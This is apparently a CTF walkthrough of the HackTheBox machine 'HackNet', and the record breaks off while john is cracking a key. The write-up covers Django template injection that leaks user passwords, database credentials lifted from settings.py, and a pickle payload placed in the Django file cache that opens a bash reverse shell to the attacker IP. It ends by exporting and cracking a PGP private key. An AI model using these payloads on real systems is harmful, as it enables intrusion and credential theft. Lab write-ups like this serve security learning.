---
tags:
  - HTB
  - Boot2Root
  - Hacking
  - SSTI
  - Django
  - GPG-Decryption
  - Linux
---
# Overview

| Name        | HackNet     |
| ----------- | ----------- |
| OS          | Linux       |
| Base Points | Medium [30] |
| Status      | Done        |
# Recon

```bash
❯ sudo nmap -sC -sV -A 10.10.11.85
[sudo] password for at0m:
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-14 00:46 +0545
Nmap scan report for 10.10.11.85
Host is up (0.32s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey:
|   256 95:62:ef:97:31:82:ff:a1:c6:08:01:8c:6a:0f:dc:1c (ECDSA)
|_  256 5f:bd:93:10:20:70:e6:09:f1:ba:6a:43:58:86:42:66 (ED25519)
80/tcp open  http    nginx 1.22.1
|_http-server-header: nginx/1.22.1
|_http-title: Did not follow redirect to http://hacknet.htb/
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 993/tcp)
HOP RTT       ADDRESS
1   335.54 ms 10.10.14.1
2   318.00 ms 10.10.11.85
```

Go to site register and login.

![[hacknet.png]]
# Enumeration 
## Dirsearch

```bash
❯ dirsearch -u http://hacknet.htb
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/at0m/Hentai/HTB/hacknet/reports/http_hacknet.htb/_25-09-14_00-48-57.txt

Target: http://hacknet.htb/

[00:48:57] Starting:
[00:50:31] 302 -    0B  - /comment  ->  /
[00:50:37] 302 -    0B  - /contacts  ->  /
[00:50:54] 200 -   15KB - /explore
[00:50:55] 404 -  555B  - /favicon.ico
[00:51:19] 200 -  857B  - /login
[00:51:20] 302 -    0B  - /logout  ->  /
[00:51:26] 301 -  169B  - /media  ->  http://hacknet.htb/media/
[00:51:26] 404 -  555B  - /media.tar.bz2
[00:51:26] 404 -  555B  - /media.tar.gz
[00:51:26] 403 -  555B  - /media/
[00:51:26] 404 -  555B  - /media.zip
[00:51:26] 404 -  555B  - /media.tar
[00:51:26] 404 -  555B  - /media/export-criteo.xml
[00:51:26] 404 -  555B  - /media_admin
[00:51:27] 302 -    0B  - /messages  ->  /
[00:52:01] 302 -    0B  - /post  ->  /
[00:52:04] 302 -    0B  - /profile  ->  /
[00:52:11] 200 -  948B  - /register
[00:52:20] 302 -    0B  - /search  ->  /
[00:52:38] 404 -  555B  - /static/api/swagger.yaml
[00:52:38] 404 -  555B  - /static/dump.sql
[00:52:38] 404 -  555B  - /static/api/swagger.json

Task Completed
```
## VHOST Fuzz

```bash
❯ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://hacknet.htb/ -H "Host: FUZZ.hacknet.htb" -mc all -fc 404 -fs 169
```

Got nothing.

Found this in Request `http://hacknet.htb/static/script.js` going there:

```js
$(document).ready(function() {
    $('.scrollingtext').bind('marquee', function() {
        var ob = $(this);
        var tw = ob.width();
        var ww = ob.parent().width();
        ob.css({ right: -tw });
        ob.animate({ right: ww }, 40000, 'linear', function() {
            ob.trigger('marquee');
        });
    }).trigger('marquee');

    $(".like").click(function(){
        var img = $(this).find('img');
        var likes_count = $(this).find('span');

        $.get( "/like/" + $(this).attr('name'), function( data ) {
            if (img.attr('src') == '/static/like.png') {
                img.attr('src', '/static/like_empty.png');
                likes_count.text(parseInt(likes_count.text()) - 1);
            } else {
                img.attr('src', '/static/like.png');
                likes_count.text(parseInt(likes_count.text()) + 1);
            }
        });
    });

    $(".hover-selection").click(function(){
        $('.likes-review-item').remove();
        $('.likes-review').css('display', 'none');
        $(this).css('display', 'none');
    });

    $(".likes").click(function(){
        var post_num = $(this).attr('post_num');
        var par = $(this).parent().find('.likes-review').css('display', 'flex');
        $('.hover-selection').css('display', 'block')

        $.get( "/likes/" + post_num, function( data ) {
            par.append(data);
        });
    });

    $(".comment").click(function(){
        var comment_post = $(this).parent().parent().parent().parent().find(".comment-post");
        var post_num = $(this).attr('post_num');
        var par = $(this).parent().parent().parent().parent().find(".comments-block");
        comment_post.toggle();

        if (comment_post.hasClass("com-toggled")) {
            par.find(".comment-item").remove();
            par.find(".comment-item-date").remove();
            comment_post.removeClass("com-toggled");
            return;
        }

        comment_post.addClass("com-toggled");

        $.get( "/comments/" + post_num, function( data ) {
            par.append(data);
        });
    });

    $(".comment-button").click(function(){
        var post_num = $(this).attr('post_num');
        var comment_text = $(this).parent().find('textarea');
        var par = $(this).parent().parent().parent().find(".comments-block");
        $.post( "/comment", {article: post_num, text: comment_text.val()}, function( data ) {
            comment_text.val("");
            var com_num = parseInt(comment_text.parent().parent().parent().find(".comments-number").text());
            comment_text.parent().parent().parent().find(".comments-number").text(com_num + 1);
            par.prepend(data);
          });
    });

});
```

It has one way of doing thing but it will be little long SSTI like by manually going at `/likes/id` so another easy way.
# Exploitation
## SSTI

Since its a Django application (Known by sending POST request at `/comment` we get option to set `debug=True` which is in Django) we can try SSTI.

![[hacknet2.png]]

Set username to `{{ users.values }}` then go to post on `Explore` and like one post (Highest liked post would be nice since it will have more users to get info) and click on likes option.

![[hacknet3.png]]

Click on `likes` and you will see all people who have liked the post then hover to your profile picture, you will see all `users` username, email and password and bio everything who have liked the post but all of it won't be shown in that webpage to show all we can intercept to see on Burp.

Click in that `likes` and intercept the request:

![[hacknet4.png]]

We get creds and everything of user. Ask GPT to make it clean.

```
ID  Username            Email                            Password           Public  Hidden  2FA
--  --------            -----                            --------           ------  ------  ---
2   hexhunter           hexhunter@ciphermail.com         H3xHunt3r!         Yes     No      No
3   rootbreaker         rootbreaker@exploitmail.net      R00tBr3@ker#       Yes     No      No
4   zero_day            zero_day@hushmail.com            Zer0D@yH@ck        Yes     No      No
6   shadowcaster        shadowcaster@darkmail.net        Sh@d0wC@st!        Yes     No      No
7   blackhat_wolf       blackhat_wolf@cypherx.com        Bl@ckW0lfH@ck      Yes     No      No
8   bytebandit          bytebandit@exploitmail.net       Byt3B@nd!t123      No      No      No
9   glitch              glitch@cypherx.com               Gl1tchH@ckz        Yes     No      No
11  phreaker            phreaker@securemail.org          Phre@k3rH@ck       No      No      No
12  codebreaker         codebreaker@ciphermail.com       C0d3Br3@k!         No      No      No
13  netninja            netninja@hushmail.com            N3tN1nj@2024       Yes     No      No
14  packetpirate        packetpirate@exploitmail.net     P@ck3tP!rat3       Yes     No      No
15  darkseeker          darkseeker@darkmail.net          D@rkSeek3r#        Yes     No      No
17  trojanhorse         trojanhorse@securemail.org       Tr0j@nH0rse!       No      No      No
19  exploit_wizard      exploit_wizard@hushmail.com      Expl01tW!zard      Yes     No      No
21  whitehat            whitehat@darkmail.net            Wh!t3H@t2024       Yes     No      No
22  deepdive            deepdive@hacknet.htb             D33pD!v3r          No      No      Yes
23  virus_viper         virus_viper@securemail.org       V!rusV!p3r2024     Yes     No      No
24  brute_force         brute_force@ciphermail.com       BrUt3F0rc3#        Yes     No      No
25  shadowwalker        shadowwalker@hushmail.com        Sh@dowW@lk2024     No      No      No
29  {{users.values}}    test1234@gmail.com               test1234           Yes     Yes     No
```

We got creds but remember that these are of who have liked this post only so we can't see some private accounts because they haven't liked this post. For us this `deepdive@hacknet.htb` stood out because it had `hacknet.htb` so tried SSH but didn't worked so logged in with his creds.

```
deepdive@hacknet.htb:D33pD!v3r
```

![[hacknet5.png]]

We will see that we have one person in contact `backdoor_bandit` (If it is not in contact then he must have sent you request to contact so accept it.) This `backdoor_bandit` is a private account that's why we couldn't find it from previous SSTI because it hadn't liked that post but now we are friends with him from `deepdive` we can see his posts or which posts he has liked.

We can see that `backdoor_bandit` has liked the post of `deepdive` if we check so we can send request to add as friend on our main account and like his (`deepdive`) post see `likes` users which will have `backdoor_bandit` also.

Go back to your main account and send `deepdive` request contact.

![[hacknet7.png]]

Accept it from `deepdive` account and again log in back to your account. Now we should be able to see post of `deepdive`, like it yourself and see that we can see `backdoor_bandit` has also liked it which means that we will be able to also see his creds.

![[hacknet8.png]]

You can just hover to your profile pic to get creds and dump but I can't screenshot it so I will intercept from Burp and send.

![[hacknet9.png]]

We got creds `mikey@hacknet.htb:mYd4rks1dEisH3re` Now SSH.
## SSH

```bash
❯ ssh mikey@hacknet.htb

mikey@hacknet:~$ ls
user.txt
mikey@hacknet:~$ cat user.txt
15c56490f886115ee3c2c9d52fe96a54
```
# Privilege Escalation

```bash
mikey@hacknet:/home$ ls
mikey  sandy
mikey@hacknet:/home$ sudo -l
[sudo] password for mikey:
Sorry, user mikey may not run sudo on hacknet.
```

```bash
mikey@hacknet:/var/www/HackNet$ ls -la
total 32
drwxr-xr-x 7 sandy sandy    4096 Feb 10  2025 .
drwxr-xr-x 4 root  root     4096 Jun  2  2024 ..
drwxr-xr-x 2 sandy sandy    4096 Dec 29  2024 backups
-rw-r--r-- 1 sandy www-data    0 Aug  8  2024 db.sqlite3
drwxr-xr-x 3 sandy sandy    4096 Sep  8 05:20 HackNet
-rwxr-xr-x 1 sandy sandy     664 May 31  2024 manage.py
drwxr-xr-x 2 sandy sandy    4096 Sep 14 17:37 media
drwxr-xr-x 6 sandy sandy    4096 Sep  8 05:22 SocialNetwork
drwxr-xr-x 3 sandy sandy    4096 May 31  2024 static
mikey@hacknet:/var/www/HackNet$ cd backups
mikey@hacknet:/var/www/HackNet/backups$ ls
backup01.sql.gpg  backup02.sql.gpg  backup03.sql.gpg
mikey@hacknet:/var/www/HackNet/backups$
```

```bash
mikey@hacknet:/var/www/HackNet/HackNet$ ls
asgi.py  __init__.py  __pycache__  settings.py  urls.py  wsgi.py
```

```bash
mikey@hacknet:/var/www/HackNet/HackNet$ cat settings.py
from pathlib import Path
import os

BASE_DIR = Path(__file__).resolve().parent.parent

SECRET_KEY = 'agyasdf&^F&ADf87AF*Df9A5D^AS%D6DflglLADIuhldfa7w'

DEBUG = False

ALLOWED_HOSTS = ['hacknet.htb']

INSTALLED_APPS = [
    'django.contrib.admin',
    'django.contrib.auth',
    'django.contrib.contenttypes',
    'django.contrib.sessions',
    'django.contrib.messages',
    'django.contrib.staticfiles',
    'SocialNetwork'
]

MIDDLEWARE = [
    'django.middleware.security.SecurityMiddleware',
    'django.contrib.sessions.middleware.SessionMiddleware',
    'django.middleware.common.CommonMiddleware',
    'django.middleware.csrf.CsrfViewMiddleware',
    'django.contrib.auth.middleware.AuthenticationMiddleware',
    'django.contrib.messages.middleware.MessageMiddleware',
    'django.middleware.clickjacking.XFrameOptionsMiddleware',
]

ROOT_URLCONF = 'HackNet.urls'

TEMPLATES = [
    {
        'BACKEND': 'django.template.backends.django.DjangoTemplates',
        'DIRS': [],
        'APP_DIRS': True,
        'OPTIONS': {
            'context_processors': [
                'django.template.context_processors.debug',
                'django.template.context_processors.request',
                'django.contrib.auth.context_processors.auth',
                'django.contrib.messages.context_processors.messages',
            ],
        },
    },
]

WSGI_APPLICATION = 'HackNet.wsgi.application'

DATABASES = {
    'default': {
        'ENGINE': 'django.db.backends.mysql',
        'NAME': 'hacknet',
        'USER': 'sandy',
        'PASSWORD': 'h@ckn3tDBpa$$',
        'HOST':'localhost',
        'PORT':'3306',
    }
}

CACHES = {
    'default': {
        'BACKEND': 'django.core.cache.backends.filebased.FileBasedCache',
        'LOCATION': '/var/tmp/django_cache',
        'TIMEOUT': 60,
        'OPTIONS': {'MAX_ENTRIES': 1000},
    }
}

AUTH_PASSWORD_VALIDATORS = [
    {
        'NAME': 'django.contrib.auth.password_validation.UserAttributeSimilarityValidator',
    },
    {
        'NAME': 'django.contrib.auth.password_validation.MinimumLengthValidator',
    },
    {
        'NAME': 'django.contrib.auth.password_validation.CommonPasswordValidator',
    },
    {
        'NAME': 'django.contrib.auth.password_validation.NumericPasswordValidator',
    },
]

SESSION_ENGINE = 'django.contrib.sessions.backends.db'

LANGUAGE_CODE = 'en-us'

TIME_ZONE = 'UTC'

USE_I18N = True

USE_L10N = True

USE_TZ = True

STATICFILES_STORAGE = 'django.contrib.staticfiles.storage.StaticFilesStorage'
STATIC_ROOT = os.path.join(BASE_DIR, 'static')
STATIC_URL = '/static/'

MEDIA_ROOT = os.path.join(BASE_DIR, 'media')
MEDIA_URL = '/media/'
<SNIP>
```

We got creds `sandy:h@ckn3tDBpa$$` but its not for SSH so we can look at MYSQL.

```bash
mikey@hacknet:~$ mysql -u sandy -p'h@ckn3tDBpa$$' -D hacknet
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 465
Server version: 10.11.11-MariaDB-0+deb12u1 Debian 12

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [hacknet]> SHOW DATABASES;
+--------------------+
| Database           |
+--------------------+
| hacknet            |
| information_schema |
| mysql              |
+--------------------+
3 rows in set (0.001 sec)
```

```bash
MariaDB [hacknet]> USE hacknet;
Database changed
MariaDB [hacknet]> SHOW TABLES;
+-----------------------------------+
| Tables_in_hacknet                 |
+-----------------------------------+
| SocialNetwork_contactrequest      |
| SocialNetwork_socialarticle       |
| SocialNetwork_socialarticle_likes |
| SocialNetwork_socialcomment       |
| SocialNetwork_socialmessage       |
| SocialNetwork_socialuser          |
| SocialNetwork_socialuser_contacts |
| auth_group                        |
| auth_group_permissions            |
| auth_permission                   |
| auth_user                         |
| auth_user_groups                  |
| auth_user_user_permissions        |
| django_admin_log                  |
| django_content_type               |
| django_migrations                 |
| django_session                    |
+-----------------------------------+
17 rows in set (0.000 sec)
```

```bash
MariaDB [hacknet]> SELECT id, username, password, email, is_superuser FROM auth_user;
+----+----------+------------------------------------------------------------------------------------------+-------+--------------+
| id | username | password                                                                                 | email | is_superuser |
+----+----------+------------------------------------------------------------------------------------------+-------+--------------+
|  1 | admin    | pbkdf2_sha256$720000$I0qcPWSgRbUeGFElugzW45$r9ymp7zwsKCKxckgnl800wTQykGK3SgdRkOxEmLiTQQ= |       |            1 |
+----+----------+------------------------------------------------------------------------------------------+-------+--------------+
1 row in set (0.000 sec)
```

But it's usually very had hash to crack so most likely no chance. We have this `agyasdf&^F&ADf87AF*Df9A5D^AS%D6DflglLADIuhldfa7w` secret key which we got from `settings.py`.

```
STATIC_ROOT = os.path.join(BASE_DIR, 'static')
STATIC_URL = '/static/'

MEDIA_ROOT = os.path.join(BASE_DIR, 'media')
MEDIA_URL = '/media/'
```

These two paths seems sus.

```bash
mikey@hacknet:/var/www/HackNet$ ls -la
total 32
drwxr-xr-x 7 sandy sandy    4096 Feb 10  2025 .
drwxr-xr-x 4 root  root     4096 Jun  2  2024 ..
drwxr-xr-x 2 sandy sandy    4096 Dec 29  2024 backups
-rw-r--r-- 1 sandy www-data    0 Aug  8  2024 db.sqlite3
drwxr-xr-x 3 sandy sandy    4096 Sep  8 05:20 HackNet
-rwxr-xr-x 1 sandy sandy     664 May 31  2024 manage.py
drwxr-xr-x 2 sandy sandy    4096 Sep 14 17:37 media
drwxr-xr-x 6 sandy sandy    4096 Sep  8 05:22 SocialNetwork
drwxr-xr-x 3 sandy sandy    4096 May 31  2024 static
```

```bash
mikey@hacknet:/var/www/HackNet$ ls -la static
total 180
drwxr-xr-x 3 sandy sandy  4096 May 31  2024 .
drwxr-xr-x 7 sandy sandy  4096 Feb 10  2025 ..
drwxr-xr-x 6 sandy sandy  4096 May 31  2024 admin
-rw-r--r-- 1 sandy sandy  4327 May 31  2024 comment.png
-rw-r--r-- 1 sandy sandy  4558 May 31  2024 delete.png
-rw-r--r-- 1 sandy sandy  5953 May 31  2024 icon.png
-rw-r--r-- 1 sandy sandy 87533 May 31  2024 jquery-3.7.1.min.js
-rw-r--r-- 1 sandy sandy  4341 May 31  2024 like_empty.png
-rw-r--r-- 1 sandy sandy   631 May 31  2024 like.png
-rw-r--r-- 1 sandy sandy  4587 May 31  2024 lock.png
-rw-r--r-- 1 sandy sandy  2725 May 31  2024 script.js
-rw-r--r-- 1 sandy sandy 15786 May 31  2024 style.css
-rw-r--r-- 1 sandy sandy 15120 May 31  2024 wr.ttf
```

`/static` isn't writeable but `/media` is

```bash
mikey@hacknet:/var/www/HackNet/media$ ls
10.png  16.png  21.jpg  3.jpg  9.png                          bird-7822272_1280.jpg       girl-7736189_1280.jpg
11.png  17.jpg  22.png  4.jpg  ai-generated-7715246_1280.jpg  cat-7610768_1280.png        guy-fawkes-8319526_1280.png
12.png  18.jpg  23.jpg  5.jpg  ai-generated-7773820_1280.jpg  dragon-7063554_1280.png     malicious.jpeg.pgp
13.png  19.jpg  24.jpg  6.jpg  ai-generated-8269765_1280.png  face-logo-8252748_1280.png  man-7923162_1280.jpg
14.png  1.jpg   25.jpg  7.png  ai-generated-8417519_1280.jpg  fishing-3550959_1280.png    profile.png
15.png  20.jpg  2.jpg   8.png  ai-generated-8700791_1280.jpg  flag-28450_1280.png         skull-4055196_1280.png
```

But this is not right way. Go to `views.py` in `/var/www/HackNet/SocialNetwork`.

```python
<SNIP>
@cache_page(60)
def explore(request):
    if not "email" in request.session.keys():
        return redirect("index")

    session_user = get_object_or_404(SocialUser, email=request.session['email'])

    page_size = 10
    keyword = ""

    if "keyword" in request.GET.keys():
        keyword = request.GET['keyword']
        posts = SocialArticle.objects.filter(text__contains=keyword).order_by("-date")
    else:
        posts = SocialArticle.objects.all().order_by("-date")

    pages = ceil(len(posts) / page_size)

    if "page" in request.GET.keys() and int(request.GET['page']) > 0:
        post_start = int(request.GET['page'])*page_size-page_size
        post_end = post_start + page_size
        posts_slice = posts[post_start:post_end]
    else:
        posts_slice = posts[:page_size]

    news = get_news()
    request.session['requests'] = session_user.contact_requests
    request.session['messages'] = session_user.unread_messages

    for post_item in posts:
        if session_user in post_item.likes.all():
            post_item.is_like = True

    posts_filtered = []
    for post in posts_slice:
        if not post.author.is_hidden or post.author == session_user:
            posts_filtered.append(post)
        for like in post.likes.all():
            if like.is_hidden and like != session_user:
                post.likes_number -= 1

    context = {"pages": pages, "posts": posts_filtered, "keyword": keyword, "news": news, "session_user": session_user}

    return render(request, "SocialNetwork/explore.html", context)
<SNIP>
```
## Little bit of Deserialization

```bash
mikey@hacknet:/var/www/HackNet/SocialNetwork$ find / -type d -perm -o+w ! -path "/proc/*" ! -path "/sys/*" 2>/dev/null
/dev/mqueue
/dev/shm
/var/tmp
/var/tmp/django_cache
/tmp
/tmp/.XIM-unix
/tmp/.X11-unix
/tmp/.font-unix
/tmp/.ICE-unix
/run/lock
```

We can write in `/var/tmp/django_cache` so let's first make a payload. From `views.py` we know to go to `http://hacknet.htb/explore` to generate cache. Do this in your Attack Machine.

```bash
mikey@hacknet:/var/tmp/django_cache$ ls
1f0acfe7480a469402f1852f8313db86.djcache  90dbab8f3b1e54369abdeb4ba1efc106.djcache
```

 Remove these `cache` first.

Read [this](https://github.com/django/django/blob/main/django/core/cache/backends/filebased.py) or fed to AI to make exploit, We need to overwrite the cache.

```
1. visit a page to generate a cache file,
2. overwrite cache file,
3. refresh page
```

```python
import pickle
import zlib
import time
import os

class PickleRCE:
    def __reduce__(self):
        return (os.system, ('bash -c "sh -i >& /dev/tcp/10.10.14.233/4444 0>&1"',))

expiry = time.time() + 3600  # Valid for 1 hour
payload = PickleRCE()

cache_content = pickle.dumps(expiry) + zlib.compress(pickle.dumps(payload))

with open('cache_payload', 'wb') as f:
    f.write(cache_content)
```

```bash
mikey@hacknet:/var/tmp/django_cache$ python3 main.py
mikey@hacknet:/var/tmp/django_cache$ ls
1f0acfe7480a469402f1852f8313db86.djcache  90dbab8f3b1e54369abdeb4ba1efc106.djcache  cache_payload  main.py
mikey@hacknet:/var/tmp/django_cache$ mv cache_payload 90dbab8f3b1e54369abdeb4ba1efc106.djcache
mv: replace '90dbab8f3b1e54369abdeb4ba1efc106.djcache', overriding mode 0600 (rw-------)? y
```

Start a listener in your Attack machine and go visit `http://hacknet.htb/explore` in your Attack Machine to trigger the cache. Sometimes there is some script I think that automatically deletes it but will be back after certain time.

```bash
❯ nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.14.233] from (UNKNOWN) [10.10.11.85] 58444
sh: 0: can't access tty; job control turned off
$ whoami
sandy
```
## Sandy

```bash
sandy@hacknet:~$ ls -la
ls -la
total 36
drwx------ 6 sandy sandy 4096 Sep 11 11:18 .
drwxr-xr-x 4 root  root  4096 Jul  3  2024 ..
lrwxrwxrwx 1 root  root     9 Sep  4 19:01 .bash_history -> /dev/null
-rw-r--r-- 1 sandy sandy  220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 sandy sandy 3526 Apr 23  2023 .bashrc
drwxr-xr-x 3 sandy sandy 4096 Jul  3  2024 .cache
drwx------ 3 sandy sandy 4096 Dec 21  2024 .config
drwx------ 4 sandy sandy 4096 Sep  5 11:33 .gnupg
drwxr-xr-x 5 sandy sandy 4096 Jul  3  2024 .local
lrwxrwxrwx 1 root  root     9 Aug  8  2024 .mysql_history -> /dev/null
-rw-r--r-- 1 sandy sandy  808 Jul 11  2024 .profile
lrwxrwxrwx 1 root  root     9 Jul  3  2024 .python_history -> /dev/null
sandy@hacknet:~$ cd .gnupg
cd .gnupg
sandy@hacknet:~/.gnupg$ ls
ls
openpgp-revocs.d   pubring.kbx   random_seed
private-keys-v1.d  pubring.kbx~  trustdb.gpg
```

```bash
sandy@hacknet:/var/www/HackNet$ ls
ls
backups  db.sqlite3  HackNet  manage.py  media  SocialNetwork  static
sandy@hacknet:/var/www/HackNet$ cd backups
cd backups
sandy@hacknet:/var/www/HackNet/backups$ ls
ls
backup01.sql.gpg  backup02.sql.gpg  backup03.sql.gpg
```

There is some script I think that automatically deletes it but will be back after certain time.

```bash
sandy@hacknet:~/.gnupg/private-keys-v1.d$ gpg --list-secret-keys
gpg --list-secret-keys
/home/sandy/.gnupg/pubring.kbx
------------------------------
sec   rsa1024 2024-12-29 [SC]
      21395E17872E64F474BF80F1D72E5C1FA19C12F7
uid           [ultimate] Sandy (My key for backups) <sandy@hacknet.htb>
ssb   rsa1024 2024-12-29 [E]
```

We already have key imported. So do `export TERM=xterm` then.

```bash
sandy@hacknet:/var/www/HackNet/backups$ GPG_TTY=$(tty) gpg --pinentry-mode loopback --decrypt backup01.sql.gpg
GPG_TTY=$(tty) gpg --pinentry-mode loopback --decrypt backup01.sql.gpg
Enter passphrase: h@ckn3tDBpa$$
gpg: encrypted with 1024-bit RSA key, ID FC53AFB0D6355F16, created 2024-12-29
      "Sandy (My key for backups) <sandy@hacknet.htb>"
gpg: public key decryption failed: Bad passphrase
gpg: decryption failed: No secret key
sandy@hacknet:/var/www/HackNet/backups$
```

It has some password and we don't know it.

```bash
sandy@hacknet:/var/www/HackNet$cp /home/sandy/.gnupg/private-keys-v1.d/armored_key.asc /tmp/private.key
sandy@hacknet:/var/www/HackNet$ chmod 644 /tmp/private.key
chmod 644 /tmp/private.key
```

```bash
mikey@hacknet:/tmp$ cat private.key
-----BEGIN PGP PRIVATE KEY BLOCK-----

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
=wR12
-----END PGP PRIVATE KEY BLOCK-----
```
## GPG2John

```bash
┌─[eu-academy-4]─[10.10.15.4]─[htb-ac-1518820@htb-o2gdr0mqht]─[~]
└──╼ [★]$ gpg2john private.key > gpg_hash.txt

File private.key
┌─[eu-academy-4]─[10.10.15.4]─[htb-ac-1518820@htb-o2gdr0mqht]─[~]
└──╼ [★]$ cat gpg_hash.txt 
Sandy:$gpg$*1*348*1024*db7e6d165a1d86f43276a4a61a9865558a3b67dbd1c6b0c25b960d293cd490d0f54227788f93637a930a185ab86bc6d4bfd324fdb4f908b41696f71db01b3930cdfbc854a81adf642f5797f94ddf7e67052ded428ee6de69fd4c38f0c6db9fccc6730479b48afde678027d0628f0b9046699033299bc37b0345c51d7fa51f83c3d857b72a1e57a8f38302ead89537b6cb2b88d0a953854ab6b0cdad4af069e69ad0b4e4f0e9b70fc3742306d2ddb255ca07eb101b07d73f69a4bd271e4612c008380ef4d5c3b6fa0a83ab37eb3c88a9240ddeda8238fd202ccc9cf076b6d21602dd2394349950be7de440618bf93bcde73e68afa590a145dc0e1f3c87b74c0e2a96c8fe354868a40ec09dd217b815b310a41449dc5fbdfca513fadd5eeae42b65389aecc628e94b5fb59cce24169c8cd59816681de7b58e5f0d0e5af267bc75a8efe0972ba7e6e3768ec96040488e5c7b2aa0a4eb1047e79372b3605*3*254*2*7*16*db35bd29d9f4006bb6a5e01f58268d96*65011712*850ffb6e35f0058b:::Sandy (My key for backups) <sandy@hacknet.htb>::private.key
┌─[eu-academy-4]─[10.10.15.4]─[htb-ac-1518820@htb-o2gdr0mqht]─[~]
└──╼ [★]$ cat gpg_hash.txt john --wordlist=/usr/share/wordlists/rockyou.txt gpg_hash.txt
cat: unrecognized option '--wordlist=/usr/share/wordlists/rockyou.txt'
Try 'cat --help' for more information.
┌─[eu-academy-4]─[10.10.15.4]─[htb-ac-1518820@htb-o2gdr0mqht]─[~]
└──╼ [★]$ john --wordlist=/usr/share/wordlists/rockyou.txt gpg_hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65011712 for all loaded hashes
